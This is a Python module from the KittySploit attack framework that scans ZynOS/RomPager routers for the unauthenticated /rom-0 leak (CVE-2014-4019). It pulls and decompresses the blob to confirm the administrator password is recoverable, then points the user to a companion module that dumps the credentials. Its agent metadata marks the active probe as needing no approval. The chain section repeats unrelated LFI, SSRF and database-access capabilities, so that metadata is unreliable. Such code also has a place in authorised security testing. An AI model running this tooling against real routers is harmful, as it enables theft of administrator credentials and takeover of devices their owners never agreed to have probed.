#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.router.rom0 import Rom0, ROM0_DEFAULT_OFFSET


class Module(Scanner, Http_client, Rom0):

    __info__ = {
        "name": "ZynOS / RomPager ROM-0 admin password disclosure detection",
        "description": (
            "Detects unauthenticated exposure of /rom-0 on ZynOS / RomPager routers. When "
            "present, the blob can be decompressed to recover the administrator password "
            "(CVE-2014-4019 class issue; D-Link DSL-2600U and related models)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2014-4019",
        "references": [
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4019",
            "http://rootatnasro.wordpress.com/2014/01/11/how-i-saved-your-a-from-the-zynos-rom-0-attack-full-disclosure/",
        ],
        "modules": [
            "auxiliary/admin/http/dlink_rom0_admin_password_disclosure",
        ],
        "tags": [
            "web",
            "scanner",
            "router",
            "d-link",
            "rom-0",
            "zynos",
            "disclosure",
            "credentials",
            "cve-2014-4019",
        ],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['risk_signals', 'endpoints'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    port = OptPort(80, "Target HTTP port", required=True)
    ssl = OptBool(False, "Use HTTPS", required=True)
    decompress_offset = OptInteger(
        ROM0_DEFAULT_OFFSET,
        "Byte offset for LZS chunk inside rom-0 (used only for password confirmation)",
        required=False,
        advanced=True,
    )

    def run(self):
        timeout = max(int(self.timeout or 10), 10)
        offset = int(self.decompress_offset or ROM0_DEFAULT_OFFSET)

        try:
            result = self.rom0_extract_from_target(offset=offset, timeout=timeout)
        except Exception as exc:
            print_error(f"Scanner failed: {exc}")
            return False

        status = result.get("status")
        reason = str(result.get("reason") or "")

        if status == "success":
            self.set_info(
                severity="critical",
                cve="CVE-2014-4019",
                reason=reason,
                confidence="high",
                endpoint="/rom-0",
                size=result.get("size"),
            )
            print_success(f"ROM-0 exposed; administrator password recoverable via /rom-0")
            print_warning("Use auxiliary/admin/http/dlink_rom0_admin_password_disclosure to dump credentials")
            return True

        if status == "extract_failed":
            self.set_info(
                severity="high",
                cve="CVE-2014-4019",
                reason=reason,
                confidence="medium",
                endpoint="/rom-0",
                size=result.get("size"),
            )
            print_warning("ROM-0 blob reachable but password extraction failed with default offset")
            return True

        if status == "vulnerable":
            self.set_info(
                severity="high",
                cve="CVE-2014-4019",
                reason=reason,
                confidence="high",
                endpoint="/rom-0",
                size=result.get("size"),
            )
            print_success(reason)
            return True

        if status == "not_vulnerable":
            self.set_info(severity="info", reason=reason, confidence="low")
            print_status(reason)
            return False

        if status == "not_found":
            print_status(reason)
            return False

        if status == "error":
            print_error(reason)
            return False

        return False
